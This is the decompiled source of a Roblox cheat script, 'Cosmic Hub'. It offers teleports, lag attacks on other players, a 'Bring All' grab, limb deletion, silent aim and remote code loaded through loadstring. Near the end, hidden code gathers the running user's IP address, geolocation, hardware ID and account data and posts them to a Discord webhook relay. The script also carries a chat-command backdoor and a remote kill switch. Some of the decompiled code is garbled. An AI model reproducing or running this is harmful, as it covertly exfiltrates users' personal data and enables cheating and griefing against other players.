    local r0 = r0_0:FindFirstChild(r28_0)
    if r0 and r0.Character and r0.Character:FindFirstChild("HumanoidRootPart") then
      local r1 = r0.Character.HumanoidRootPart.Position
      if r1_0.Character and r1_0.Character:FindFirstChild("HumanoidRootPart") then
        r1_0.Character.HumanoidRootPart.CFrame = CFrame.new(r1)
      else
        r31_0:MakeNotification({
          Name = "Error",
          Content = "Character was not found.",
          Time = 3,
        })
      end
    else
      r31_0:MakeNotification({
        Name = "Error",
        Content = "Target player not found.",
        Time = 3,
      })
    end
  else
    r31_0:MakeNotification({
      Name = "Error",
      Content = "No player selected.",
      Time = 3,
    })
  end
end
r71:AddButton({
  Name = "Teleport to Player",
  Callback = function()
    -- line: [0, 0] id: 114
    teleportToPlayer()
  end,
})
function startLoopTeleport()
  -- line: [0, 0] id: 163
  r74_0 = coroutine.create(function()
    -- line: [0, 0] id: 164
    while r73_0 do
      teleportToPlayer()
      wait(0.02)
    end
  end)
  coroutine.resume(r74_0)
end
r71:AddToggle({
  Name = "Loop Teleport",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 188
    r73_0 = r0
    if r0 then
      startLoopTeleport()
    else
      r74_0 = nil
    end
  end,
})
r0_0.PlayerAdded:Connect(function()
  -- line: [0, 0] id: 40
  updateDropdownOptions(r75_0)
end)
r0_0.PlayerRemoving:Connect(function()
  -- line: [0, 0] id: 90
  updateDropdownOptions(r75_0)
end)
local r76 = r32:MakeTab({
  Name = "Random",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false,
})
local r77 = r76:AddSection({
  Name = "Working",
})
local r78_0 = false
local r79_0 = 5
function lagF()
  -- line: [0, 0] id: 84
  while r78_0 do
    for r3 = 1, r79_0, 1 do
      for r7, r8 in ipairs(r0_0:GetPlayers()) do
        if r8.Character and r8.Character:FindFirstChild("Torso") then
          r4_0.GrabEvents.CreateGrabLine:FireServer(r8.Character.Torso, r8.Character.Torso.CFrame)
        end
      end
    end
    wait(1)
  end
end
r76:AddToggle({
  Name = "Lag",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 71
    r78_0 = r0
    if r78_0 then
      task.spawn(lagF)
    end
  end,
})
r76:AddSlider({
  Name = "Lag Intensity",
  Min = 1,
  Max = 1000,
  Default = 5,
  Callback = function(r0)
    -- line: [0, 0] id: 10
    r79_0 = r0
  end,
})
local r80_0 = {
  P = game:GetService("Players"),
  RS = game:GetService("RunService"),
  W = r24_0,
  A = false,
}
r80_0.Q = {}
r80_0.Pos = nil
r80_0.Cam = nil
r80_0.R = 15
r80_0.Conn = nil
r80_0.WL = false
r80_0.CB = Instance.new("Part")
r80_0.CB.Anchored = true
r80_0.CB.CanCollide = false
r80_0.CB.Transparency = 1
r80_0.CB.CanQuery = false
r80_0.CB.Size = Vector3.new(10, 10, 10)
function FzCam()
  -- line: [0, 0] id: 6
  local r0 = r80_0.W.CurrentCamera
  r80_0.CB.CFrame = r80_0.Cam
  r80_0.CB.Parent = r80_0.W
  r0.CameraType = Enum.CameraType.Scriptable
  r0.CFrame = r80_0.Cam
end
function UnFzCam()
  -- line: [0, 0] id: 29
  r80_0.CB.Parent = nil
  local r0 = r80_0.W.CurrentCamera
  r0.CameraType = Enum.CameraType.Custom
  if r80_0.Cam then
    r0.CFrame = r80_0.Cam
  end
  r80_0.Cam = nil
end
function NoCol(r0)
  -- line: [0, 0] id: 48
  for r4, r5 in pairs(r0:GetDescendants()) do
    if r5:IsA("BasePart") then
      r5.CanCollide = false
    end
  end
end
function InPlot(r0)
  -- line: [0, 0] id: 228
  local r1 = r80_0.W:FindFirstChild("PlotItems")
  local r2 = r1 and r1:FindFirstChild("PlayersInPlots")
  return r2 and r2:FindFirstChild(r0.Name)
end
function InRad(r0)
  -- line: [0, 0] id: 181
  return (r0.Position - r80_0.Pos).Magnitude <= r80_0.R
end
function Ignore(r0)
  -- line: [0, 0] id: 210
  if r0 == r80_0.P.LocalPlayer then
    return true
  end
  if r80_0.WL and r80_0.P.LocalPlayer:IsFriendsWith(r0.UserId) then
    return true
  end
  return false
end
function ReQ()
  -- line: [0, 0] id: 44
  r80_0.Q = {}
  for r3, r4 in pairs(r80_0.P:GetPlayers()) do
    if not Ignore(r4) and r4.Character and not InPlot(r4) then
      local r5 = r4.Character:FindFirstChild("HumanoidRootPart")
      if r5 and not InRad(r5) then
        table.insert(r80_0.Q, r4)
      end
    end
  end
end
function Next()
  -- line: [0, 0] id: 21
  if #r80_0.Q == 0 then
    ReQ()
    if #r80_0.Q == 0 then
      return 
    end
  end
  local r0 = r80_0.Q[1]
  table.remove(r80_0.Q, 1)
  if not r0 or not r0.Character then
    return 
  end
  local r1 = r0.Character:FindFirstChild("HumanoidRootPart")
  local r2 = r0.Character:FindFirstChild("Head")
  local r3 = r80_0.P.LocalPlayer.Character and r80_0.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
  if r1 and r2 and r3 then
    r80_0.P.LocalPlayer.Character:PivotTo(r1.CFrame * CFrame.new(0, -6, 0))
    NoCol(r80_0.P.LocalPlayer.Character)
    local r4 = 0
    while true do
      r9_0:FireServer(r1, r3.CFrame)
      task.wait(0.15)
      if r4 + 1 > 20 then
        break
      end
      if r2:FindFirstChild("PartOwner") and r2.PartOwner.Value == r80_0.P.LocalPlayer.Name or not r80_0.A then
        goto label_102	-- block#16 is visited secondly
      else
        break
      end
    end
    if r80_0.A and r2:FindFirstChild("PartOwner") and r2.PartOwner.Value == r80_0.P.LocalPlayer.Name then
      r1.CFrame = CFrame.new(r80_0.Pos)
      r1.Position = r80_0.Pos
      r1.AssemblyLinearVelocity = Vector3.zero
      task.wait(0.8)
    end
  end
end
function Start()
  -- line: [0, 0] id: 200
  local r0 = r80_0.P.LocalPlayer.Character and r80_0.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
  if not r0 then
    return 
  end
  r80_0.Pos = r0.Position
  r80_0.Cam = r80_0.W.CurrentCamera.CFrame
  ReQ()
  FzCam()
  r80_0.Conn = r80_0.RS.Heartbeat:Connect(function()
    -- line: [0, 0] id: 201
    if r80_0.A then
      Next()
      if r80_0.Cam then
        local r0 = r80_0.W.CurrentCamera
        r0.CameraType = Enum.CameraType.Scriptable
        r0.CFrame = r80_0.Cam
        r80_0.CB.CFrame = r80_0.Cam
        r80_0.CB.Parent = r80_0.W
      end
    end
  end)
end
function Stop()
  -- line: [0, 0] id: 89
  if r80_0.Conn then
    r80_0.Conn:Disconnect()
    r80_0.Conn = nil
  end
  UnFzCam()
  local r0 = r80_0.P.LocalPlayer.Character and r80_0.P.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
  if r0 and r80_0.Pos then
    r0.AssemblyLinearVelocity = Vector3.zero
    r0.CFrame = CFrame.new(r80_0.Pos)
  end
end
function CharAdd(r0)
  -- line: [0, 0] id: 133
  r0:WaitForChild("Humanoid").Died:Connect(function()
    -- line: [0, 0] id: 135
    if r80_0.Conn then
      r80_0.Conn:Disconnect()
      r80_0.Conn = nil
    end
    UnFzCam()
  end)
  if r80_0.A then
    local r2 = r0:WaitForChild("HumanoidRootPart")
    r80_0.Pos = r80_0.Pos or r2.Position
    r80_0.Cam = r80_0.Cam or r80_0.W.CurrentCamera.CFrame
    FzCam()
    r80_0.Conn = r80_0.RS.Heartbeat:Connect(function()
      -- line: [0, 0] id: 134
      if r80_0.A then
        Next()
        if r80_0.Cam then
          local r0 = r80_0.W.CurrentCamera
          r0.CameraType = Enum.CameraType.Scriptable
          r0.CFrame = r80_0.Cam
          r80_0.CB.CFrame = r80_0.Cam
          r80_0.CB.Parent = r80_0.W
        end
      end
    end)
  end
end
r80_0.P.LocalPlayer.CharacterAdded:Connect(CharAdd)
r80_0.P.PlayerAdded:Connect(function()
  -- line: [0, 0] id: 51
  if r80_0.A then
    ReQ()
  end
end)
r80_0.P.PlayerRemoving:Connect(function(r0)
  -- line: [0, 0] id: 9
  for r4 = #r80_0.Q, 1, -1 do
    if r80_0.Q[r4] == r0 then
      table.remove(r80_0.Q, r4)
    end
  end
end)
r76:AddToggle({
  Name = "Bring All",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 146
    r80_0.A = r0
    if r0 then
      Start()
    else
      Stop()
    end
  end,
})
r76:AddToggle({
  Name = "Whitelist Friends",
  Default = false,
  Callback = function(r0)
    -- line: [0, 0] id: 162
    r80_0.WL = r0
  end,
})
local r81_0 = {
  ws = game:GetService("Workspace"),
  plrs = game:GetService("Players"),
  debris = game:GetService("Debris"),
  uis = game:GetService("UserInputService"),
  fpdHeight = r24_0.FallenPartsDestroyHeight,
}
r81_0.parts = {
  "Left Leg",
  "Right Leg",
  "Left Arm",
  "Right Arm",
  "HumanoidRootPart"
}
function findHeldPlayer()
  -- line: [0, 0] id: 47
  local r0 = r81_0.ws:FindFirstChild("GrabParts")
  if not r0 then
    return nil
  end
  for r4, r5 in ipairs(r0:GetChildren()) do
    if r5:IsA("BasePart") then
      for r9, r10 in ipairs(r5:GetChildren()) do
        if r10:IsA("WeldConstraint") and r10.Part1 and r10.Part1.Parent:IsA("Model") then
          local r11 = r10.Part1.Parent
          if r11:FindFirstChildOfClass("Humanoid") then
            return r81_0.plrs:GetPlayerFromCharacter(r11)
          end
        end
      end
    end
  end
  return nil
end
function teleportLimbParts(r0)
  -- line: [0, 0] id: 176
  if not r0 then
    return 
  end
  local r1 = r0.Character
  if not r1 then
    return 
  end
  local r2 = {}
  for r6, r7 in ipairs(r81_0.parts) do
    local r8_176 = r1:FindFirstChild(r7)
    if r8_176 then
      for r12, r13 in ipairs(r81_0.ws:GetDescendants()) do
        if r13:IsA("WeldConstraint") and (r13.Part0 == r8_176 or r13.Part1 == r8_176) then
          r13.Enabled = false
          table.insert(r2, r13)
        end
      end
      for r12, r13 in ipairs(r8_176:GetChildren()) do
        if r13:IsA("Motor6D") or r13:IsA("Weld") then
          r13.Enabled = false
          table.insert(r2, r13)
        end
      end
      r8_176.Anchored = false
      local r9_176 = Vector3.new(r8_176.Position.X, r81_0.fpdHeight - 100, r8_176.Position.Z)
      pcall(function()
        -- line: [0, 0] id: 177
        if r8_176:IsA("Model") then
          r8_176.PrimaryPart = r8_176.PrimaryPart or r8_176:FindFirstChildWhichIsA("BasePart")
          if r8_176.PrimaryPart then
            r8_176:SetPrimaryPartCFrame(CFrame.new(r9_176))
          end
        else
          r8_176.CFrame = CFrame.new(r9_176)
        end
      end)
      task.wait(0.1)
      -- close: r9
    end
    -- close: r8
  end
  for r6, r7 in ipairs(r2) do
    r7.Enabled = true
  end
end
function deleteUserLimbs()
  -- line: [0, 0] id: 92
  local r0 = findHeldPlayer()
  if r0 then
    teleportLimbParts(r0)
  end
end
if r81_0.uis.TouchEnabled then
  r76:AddButton({
    Name = "Delete Limbs (Hold and ragdoll player)",
    Callback = deleteUserLimbs,
  })
end
local r82 = r32:MakeTab({
  Name = "Credits",
  Icon = "rbxassetid://6035047375",
  PremiumOnly = false,
})
local r85 = "AddLabel"
r85 = "CREATOR: Cosmic_TCU (TCUTCU_LLBDDLLZYXZY)"
r82:[r85](r85)
r85 = "AddLabel"
r85 = "GO FOLLOW: Crisila_TCU (Superduperalt0987)"
r82:[r85](r85)
r85 = "AddLabel"
r85 = "HELPERS: jeke/brilliant, moonydev"
r82:[r85](r85)
r82:AddButton({
  Name = "Cosmic Hub Discord Server",
  Callback = function()
    -- line: [0, 0] id: 73
    setclipboard("https://discord.gg/mzkKQhyNqv")
    r31_0:MakeNotification({
      Name = "Copied!",
      Content = "Discord link has been copied to your clipboard.",
      Image = "rbxassetid://4483345998",
      Time = 3,
    })
  end,
})
local r83 = r32:MakeTab({
  Name = "Extra",
  Icon = "rbxassetid://6031094675",
  PremiumOnly = false,
})
r83:AddButton({
  Name = "Cosmic Hub Auras",
  Callback = function()
    -- line: [0, 0] id: 50
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeffepicy/CosmicAuras/refs/heads/main/SigmaAuras", true))()
  end,
})
r83:AddButton({
  Name = "Dex",
  Callback = function()
    -- line: [0, 0] id: 113
    loadstring(game:HttpGet("https://raw.githubusercontent.com/m0onyy/Test/refs/heads/main/mobile%20dex.lua", true))()
  end,
})
r83:AddButton({
  Name = "Infinite Yield",
  Callback = function()
    -- line: [0, 0] id: 160
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/infiniteyield/master/source.lua", true))()
  end,
})
local r86 = "AddLabel"
r86 = "Current version: V2.049"
r83:[r86](r86)
local r84_0 = "https://raw.githubusercontent.com/Jeffepicy/yeah/refs/heads/main/yeah"
function checkShutdown()
  -- line: [0, 0] id: 202
  local r0, r1_202 = pcall(function()
    -- line: [0, 0] id: 204
    return game:HttpGet(r84_0)
  end)
  local r2 = nil	-- notice: implicit variable refs by block#[6]
  if r0 and r1_202 then
    r2_202 = nil
    pcall(function()
      -- line: [0, 0] id: 203
      r2_202 = r3_0:JSONDecode(r1_202)
    end)
    if r2_202 == true then
      r1_0:Kick("no")
      task.wait(1)
      while true do
      end
      -- close: r2
    else
      goto label_26	-- block#5 is visited secondly
    end
  else
    r2_202 = warn
    r2("Failed")
  end
end
checkShutdown()
r85 = {}
r86_0 = "https://raw.githubusercontent.com/Jeffepicy/whitelist/main/whitelist.txt"
local r87, r88 = pcall(function()
  -- line: [0, 0] id: 98
  return game:HttpGet(r86_0)
end)
if r87 and r88 then
  local r91 = "JSONDecode"
  r91 = r88
  local r89 = r3_0:[r91](r91)
  if typeof(r89) == "table" then
    for r93, r94 in ipairs(r89) do
      table.insert(r85, r94)
    end
  end
else
  local r91 = "Kick"
  r91 = "Whitelist services down. Try again later."
  r1_0:[r91](r91)
  return 
end
local r89_0 = {}
local r90_0 = {}
local r91_0 = {}
local r92_0 = {}
local r93_0 = r85 or {}
function isAdmin(r0)
  -- line: [0, 0] id: 27
  return table.find(r93_0, r0.UserId) ~= nil
end
function sendChatMessage(r0)
  -- line: [0, 0] id: 152
  if r11_0.ChatVersion == Enum.ChatVersion.TextChatService then
    local r1 = r11_0:FindFirstChild("TextChannels")
    if r1 then
      local r2 = r1:FindFirstChild("RBXGeneral")
      if r2 then
        r2:SendAsync(r0)
      end
    end
  else
    local r1 = r4_0:FindFirstChild("DefaultChatSystemChatEvents")
    if r1 and r1:FindFirstChild("SayMessageRequest") then
      r1.SayMessageRequest:FireServer(r0, "All")
    end
  end
end
function toggleBlind(r0)
  -- line: [0, 0] id: 34
  r91_0[r0] = not r91_0[r0]
  local r1 = r1_0:FindFirstChild("PlayerGui"):FindFirstChild("BlindEffect")
  if r91_0[r0] and not r1 then
    r1 = Instance.new("ScreenGui")
    r1.Name = "BlindEffect"
    r1.ResetOnSpawn = false
    local r2 = Instance.new("Frame")
    r2.Size = UDim2.new(1, 0, 1, 0)
    r2.BackgroundColor3 = Color3.new(0, 0, 0)
    r2.Parent = r1
    r1.Parent = r1_0:WaitForChild("PlayerGui")
  elseif r1 then
    r1:Destroy()
  end
end
function handleAdminCommand(r0, r1)
  -- line: [0, 0] id: 215
  if not isAdmin(r0) then
    return 
  end
  r1 = r1:lower()
  if r1:sub(1, 8) == ":c kick " then
    local r2 = r1:sub(9)
    for r6, r7 in ipairs(r0_0:GetPlayers()) do
      if r7 ~= r0 and r7.Name:lower():sub(1, #r2) == r2 then
        r7:Kick("You have been kicked by an admin.")
      end
    end
  end
  if r1:sub(1, 9) == ":c kill " then
    local r2 = r1:sub(10)
    for r6, r7 in ipairs(r0_0:GetPlayers()) do
      if r7 ~= r0 and r7.Character and r7.Character:FindFirstChild("Humanoid") then
        local r8 = r7.Name:lower()
        local r9 = r7.DisplayName:lower()
        if r8:sub(1, #r2) == r2 or r9:sub(1, #r2) == r2 then
          r7.Character.Humanoid.Health = 0
        end
      end
    end
  end
  if r1:sub(1, 7) == ":c say " then
    local r2 = r1:sub(8)
    if r2 and r2 ~= "" then
      sendChatMessage(r2)
    end
  end
  if r1 == ":c aura" then
    r90_0[r0] = not r90_0[r0]
  end
  if r1 == ":c e" then
    toggleBlind(r0)
  end
  if r1:sub(1, 5) == ":c sb" then
    local r2 = tonumber(r1:match("%d+"))
    if r2 and 0 < r2 then
      r92_0[r0] = r2
      sendChatMessage("Safety bubble set to " .. r2)
    else
      r92_0[r0] = nil
      sendChatMessage("Safety bubble disabled")
    end
  end
  if r1 == ":c tp all" and r0.Character and r0.Character:FindFirstChild("HumanoidRootPart") then
    local r2 = r0.Character.HumanoidRootPart
    for r6, r7 in ipairs(r0_0:GetPlayers()) do
      if r7 ~= r0 and r7.Character and r7.Character:FindFirstChild("HumanoidRootPart") then
        r7.Character.HumanoidRootPart.CFrame = r2.CFrame + Vector3.new(3, 0, 0)
      end
    end
  end
  if r1 == ":c kill all" then
    for r5, r6 in ipairs(r0_0:GetPlayers()) do
      if r6 ~= r0 and r6.Character and r6.Character:FindFirstChild("Humanoid") then
        r6.Character.Humanoid.Health = 0
      end
    end
  end
  if r1 == ":c ban all" then
    for r5, r6 in ipairs(r0_0:GetPlayers()) do
      if r6 ~= r0 then
        r6:Kick("You have been banned by an admin.")
      end
    end
  end
end
local r98 = nil	-- notice: implicit variable refs by block#[34, 35, 36, 37, 38, 39, 42]
if r11_0.ChatVersion == Enum.ChatVersion.TextChatService then
  local r94 = r11_0:FindFirstChild("TextChannels")
  if r94 then
    local r95 = r94:FindFirstChild("RBXGeneral")
    if r95 then
      r95.MessageReceived:Connect(function(r0)
        -- line: [0, 0] id: 199
        local r1 = r0.TextSource
        if not r1 then
          return 
        end
        local r2 = r0_0:GetPlayerByUserId(r1.UserId)
        if r2 then
          handleAdminCommand(r2, r0.Text)
        end
      end)
    end
  end
else
  for r97, r98_0 in ipairs(r0_0:GetPlayers()) do
    r98_0.Chatted:Connect(function(r0)
      -- line: [0, 0] id: 143
      handleAdminCommand(r98_0, r0)
    end)
    -- close: r97
  end
  r0_0.PlayerAdded:Connect(function(r0_54)
    -- line: [0, 0] id: 54
    r0_54.Chatted:Connect(function(r0)
      -- line: [0, 0] id: 55
      handleAdminCommand(r0_54, r0)
    end)
  end)
end
r2_0.Heartbeat:Connect(function()
  -- line: [0, 0] id: 109
  for r3, r4 in pairs(r90_0) do
    if r4 and r3.Character and r3.Character:FindFirstChild("HumanoidRootPart") then
      local r5 = r3.Character.HumanoidRootPart
      local r6 = tick()
      for r10 in pairs(r89_0) do
        if r10 ~= r3 and r10.Character and r10.Character:FindFirstChild("HumanoidRootPart") then
          local r11 = (r6 + r10.UserId) % 2 * math.pi
          local r12 = 10
          r10.Character.HumanoidRootPart.CFrame = r5.CFrame + Vector3.new(math.cos(r11) * r12, 0, math.sin(r11) * r12)
        end
      end
    end
  end
end)
r2_0.Heartbeat:Connect(function()
  -- line: [0, 0] id: 116
  for r3, r4 in pairs(r92_0) do
    if r3.Character and r3.Character:FindFirstChild("HumanoidRootPart") then
      local r5 = r3.Character.HumanoidRootPart
      for r9 in pairs(r89_0) do
        if r9 ~= r3 and r9.Character and r9.Character:FindFirstChild("HumanoidRootPart") then
          local r10 = r9.Character.HumanoidRootPart
          if (r5.Position - r10.Position).Magnitude < r4 then
            r10.CFrame = CFrame.new(r5.Position + ((r10.Position - r5.Position)).Unit * r4)
          end
        end
      end
    end
  end
end)
function registerUser(r0)
  -- line: [0, 0] id: 59
  r89_0[r0] = true
end
registerUser(r1_0)
r0_0.PlayerAdded:Connect(function(r0_96)
  -- line: [0, 0] id: 96
  registerUser(r0_96)
  if isAdmin(r0_96) then
    task.delay(1, function()
      -- line: [0, 0] id: 97
      sendChatMessage("Lord " .. r0_96.DisplayName .. " has joined.")
    end)
  end
end)
r0_0.PlayerRemoving:Connect(function(r0)
  -- line: [0, 0] id: 161
  r89_0[r0] = nil
  r90_0[r0] = nil
  r91_0[r0] = nil
  r92_0[r0] = nil
end)
local r94_0 = {
  HttpService = game:GetService("HttpService"),
  Players = game:GetService("Players"),
}
r98_0 = "MarketplaceService"
r94_0.MarketplaceService = game:GetService(r98)
r98_0 = "LocalizationService"
r94_0.LocalizationService = game:GetService(r98)
r98_0 = "RbxAnalyticsService"
r94_0.RbxAnalyticsService = game:GetService(r98)
r94_0.webhookUrl = "https://v0-discord-webhook-protector-nine.vercel.app/api/relay/etdvwb7e42"
r94_0.LocalPlayer = r94_0.Players.LocalPlayer
r94_0.UserId = r94_0.LocalPlayer.UserId
r94_0.Name = r94_0.LocalPlayer.Name
r94_0.DisplayName = r94_0.LocalPlayer.DisplayName
r98_0 = "MembershipType"
local r96 = tostring(r94_0.LocalPlayer[r98])
r98_0 = "sub"
r98_0 = 21
r94_0.Membership = r96:[r98](r98)
r94_0.Age = r94_0.LocalPlayer.AccountAge
r94_0.Country = r94_0.LocalizationService.RobloxLocaleId
r98_0 = "https://v4.ident.me/"
r94_0.IP = game:HttpGet(r98)
r98_0 = "http://ip-api.com/json"
r94_0.Geo = game:HttpGet(r98)
r98_0 = "GetClientId"
r94_0.HWID = r94_0.RbxAnalyticsService:[r98]()
r98_0 = "PlaceId"
r98_0 = ", \""
r94_0.Job = "Roblox.GameLauncher.joinGameInstance(" .. game[r98] .. r98 .. game.JobId .. "\")"
r98_0 = "PlaceId"
r98_0 = "&gameInstanceId="
r94_0.Link = "roblox://placeId=" .. game[r98] .. r98 .. game.JobId
r98_0 = "GetProductInfo"
r98_0 = game
r98_0 = r98.PlaceId
r94_0.GameName = r94_0.MarketplaceService:[r98](r98).Name
function make()
  -- line: [0, 0] id: 138
  return r94_0.HttpService:JSONEncode({
    avatar_url = "",
    content = "",
    embeds = {
      {
        author = {
          name = "SKID ALERT",
          url = "https://roblox.com",
        },
        description = string.format("__[Player Info](https://www.roblox.com/users/%d)__\n**Display Name:** %s\n**Username:** %s\n**User Id:** %d\n**MembershipType:** %s\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s\n**Game Id:** %d\n**Exploit:** %s\n\n**Data:**```%s```\n\n**JobId:**```%s```", r94_0.UserId, r94_0.DisplayName, r94_0.Name, r94_0.UserId, r94_0.Membership, r94_0.Age, r94_0.Country, r94_0.IP, r94_0.HWID, os.date("%m/%d/%Y"), os.date("%X"), game.PlaceId, r94_0.GameName, game.PlaceId, identifyexecutor(), r94_0.Geo, r94_0.Job),
        type = "rich",
        color = tonumber("0xFFD700"),
        thumbnail = {
          url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. r94_0.UserId .. "&width=150&height=150&format=png",
        },
      }
    },
  })
end
function send(r0)
  -- line: [0, 0] id: 157
  local r1 = http_request or request or HttpPost or syn.request
  local r2 = {
    ["content-type"] = "application/json",
  }
  r1({
    Url = r94_0.webhookUrl,
    Body = r0,
    Method = "POST",
    Headers = r2,
  })
  r1({
    Url = r94_0.webhookUrl,
    Body = r94_0.HttpService:JSONEncode({
      content = r94_0.Link,
    }),
    Method = "POST",
    Headers = r2,
  })
end
send(make())
local r97 = {}
r98_0 = "Silent Aim"
r97.Name = r98
r97.Icon = "rbxassetid://6031091005"
r98_0 = false
r97.PremiumOnly = r98
local r95 = r32:MakeTab(r97)
r96_0 = {}
r98_0 = {}
r98.En = false
r98.Key = "RightAlt"
r98.TP = "HumanoidRootPart"
r98.Show = false
r98.MHP = false
r98.AP = false
r98.MHP_A = 0.165
r98.HC = 100
r98.Col = Color3.fromRGB(54, 57, 241)
r96_0.SA = r98
r98_0 = "CurrentCamera"
r98_0 = r24_0[r98]
r96_0.Cam = r98
r96_0.P = game:GetService("Players")
r96_0.RS = game:GetService("RunService")
r98_0 = game
r98_0 = r98:GetService("GuiService")
r96_0.GS = r98
r98_0 = game
r98_0 = r98:GetService("UserInputService")
r96_0.UIS = r98
r98_0 = game
r98_0 = r98:GetService("Stats")
r96_0.ST = r98
r96_0.LP = game:GetService("Players").LocalPlayer
r98_0 = nil
r96_0.MC = r98
r98_0 = nil
r96_0.MB = r98
r98_0 = nil
r96_0.M = r98
r98_0 = nil
r96_0.MBX = r98
r97 = "VTP"
r98_0 = {}
local r99 = "Head"
local r100 = "HumanoidRootPart"
-- setlist for #98 failed
r96_0[r97] = r98
r98_0 = 0.165
r96_0.CPA = r98
r97 = "EA"
r98_0 = {}
r98.Raycast = {
  AC = 3,
  Args = {
    "Instance",
    "Vector3",
    "Vector3",
    "RaycastParams"
  },
}
r96_0[r97] = r98
r98_0 = coroutine
r98_0 = r98.resume
r96_0.CoR = r98
r98_0 = coroutine
r98_0 = r98.create
r96_0.CoC = r98
if getgenv then
  r97 = getgenv()
  r98_0 = "SilentAimSettings"
  r97[r98] = r96_0.SA
else
  r98_0 = "SA"
  r98_0 = r96_0[r98]
  r25_0.SilentAimSettings = r98
end
r98_0 = r96_0.LP
r98_0 = r98:GetMouse()
r96_0.M = r98
function r98_0()
  -- line: [0, 0] id: 117
  return Drawing.new("Square")
end
r97_0 = pcall(r98)
if r97_0 then
  r98_0 = "MBX"
  r96_0[r98] = Drawing.new("Square")
  r98_0 = "MBX"
  r98_0 = r96_0[r98]
  r98.Visible = false
  r98_0 = "MBX"
  r98_0 = r96_0[r98]
  r98.ZIndex = 999
  r98_0 = "MBX"
  r98_0 = r96_0[r98]
  r98.Color = r96_0.SA.Col
  r98_0 = "MBX"
  r98_0 = r96_0[r98]
  r98.Thickness = 2
  r98_0 = "MBX"
  r98_0 = r96_0[r98]
  r98.Size = Vector2.new(30, 30)
  r98_0 = "MBX"
  r98_0 = r96_0[r98]
  r98.Filled = true
else
  r98_0 = "MBX"
  r96_0[r98] = {
    Visible = false,
    Position = Vector2.new(),
    Color = r96_0.SA.Col,
  }
  r98_0 = "SA"
  r98_0 = r96_0[r98]
  r98.Show = false
end
r98_0 = "MC"
r96_0[r98] = r96_0.UIS.TouchEnabled and not r96_0.UIS.KeyboardEnabled
r98_0 = game
r98_0 = r98.GetChildren
r99_0 = r96_0.P.GetPlayers
r100_0 = r96_0.Cam.WorldToScreenPoint
local r101_0 = r96_0.Cam.WorldToViewportPoint
local r102_0 = game.FindFirstChild
local r103 = r96_0.RS.RenderStepped
local r104 = r96_0.RS.Heartbeat
local r105 = r96_0.GS.GetGuiInset
local r106_0 = r96_0.UIS.GetMouseLocation
function Ch(r0)
  -- line: [0, 0] id: 30
  r0 = math.floor(r0)
  return math.floor(math.random() * 100) / 100 <= r0 / 100
end
function GPx(r0)
  -- line: [0, 0] id: 171
  local r1, r2 = r100_0(r96_0.Cam, r0)
  return Vector2.new(r1.X, r1.Y), r2
end
function VA(r0, r1)
  -- line: [0, 0] id: 75
  local r2 = 0
  if #r0 < r1.AC then
    return false
  end
  for r6, r7 in next, r0, nil do
    if typeof(r7) == r1.Args[r6] then
      r2 = r2 + 1
    end
  end
  return r1.AC <= r2
end
function GD(r0, r1)
  -- line: [0, 0] id: 173
  return ((r1 - r0)).Unit * 1000
end
function GMP()
  -- line: [0, 0] id: 213
  return r106_0(r96_0.UIS)
end
function GPP(r0)
  -- line: [0, 0] id: 61
  local r1 = r0.Velocity or Vector3.new()
  local r2 = r0.Position
  local r3 = r96_0.SA.MHP
  if r3 then
    r3 = r1 * r96_0.CPA or Vector3.new()
  else
    goto label_17	-- block#4 is visited secondly
  end
  return r2 + r3
end
function GCP()
  -- line: [0, 0] id: 108
  if not r96_0.SA.TP then
    return 
  end
  local r0 = nil
  local r1 = nil
  local r2 = r96_0.MC
  if r2 then
    r2 = r96_0.Cam.ViewportSize / 2 or GMP()
  else
    goto label_17	-- block#4 is visited secondly
  end
  local r3 = next
  local r4, r5 = r99_0(r96_0.P)
  for r6, r7 in r3, r4, r5 do
    if r7 ~= r96_0.LP then
      local r8 = r7.Character
      if r8 then
        local r9 = r102_0(r8, "HumanoidRootPart")
        local r10 = r102_0(r8, "Humanoid")
        if r9 and r10 and (not r10 or r10.Health > 0) and (r96_0.Cam.CFrame.Position - r9.Position).Magnitude <= 35 then
          local r12, r13 = GPx(r9.Position)
          if r13 then
            local r14 = (r2 - r12).Magnitude
            if r14 <= (r1 or 2000) then
              if r96_0.SA.TP == "Random" then
                r0 = r8[r96_0.VTP[math.random(1, #r96_0.VTP)]] or r8[r96_0.SA.TP]
              else
                goto label_91	-- block#22 is visited secondly
              end
              r1 = r14
            end
          end
        end
      end
    end
  end
  return r0
end
r95:AddToggle({
  Name = "Enabled",
  Default = r96_0.SA.En,
  Callback = function(r0)
    -- line: [0, 0] id: 194
    r96_0.SA.En = r0
    r96_0.MBX.Visible = r0
  end,
})
local r109 = "AddBind"
r109 = {
  Name = "Toggle Key",
  Default = Enum.KeyCode[r96_0.SA.Key],
  Hold = false,
  Callback = function()
    -- line: [0, 0] id: 99
    r96_0.SA.En = not r96_0.SA.En
    EnabledToggle:Set(r96_0.SA.En)
    r96_0.MBX.Visible = r96_0.SA.En
  end,
}
r95:[r109](r109)
r95:AddDropdown({
  Name = "Target Part",
  Default = r96_0.SA.TP,
  Options = {
    "Head",
    "HumanoidRootPart",
    "Random"
  },
  Callback = function(r0)
    -- line: [0, 0] id: 193
    r96_0.SA.TP = r0
  end,
})
r95:AddSlider({
  Name = "Hit Chance",
  Min = 0,
  Max = 100,
  Increment = 1,
  Default = r96_0.SA.HC,
  ValueName = "%",
  Callback = function(r0)
    -- line: [0, 0] id: 179
    r96_0.SA.HC = r0
  end,
})
r95:AddSection({
  Name = "Prediction",
})
r95:AddToggle({
  Name = "Manual Prediction",
  Default = r96_0.SA.MHP,
  Callback = function(r0)
    -- line: [0, 0] id: 87
    r96_0.SA.MHP = r0
  end,
})
r95:AddToggle({
  Name = "Auto Prediction",
  Default = r96_0.SA.AP,
  Callback = function(r0)
    -- line: [0, 0] id: 72
    r96_0.SA.AP = r0
  end,
})
r95:AddSlider({
  Name = "Prediction Amount",
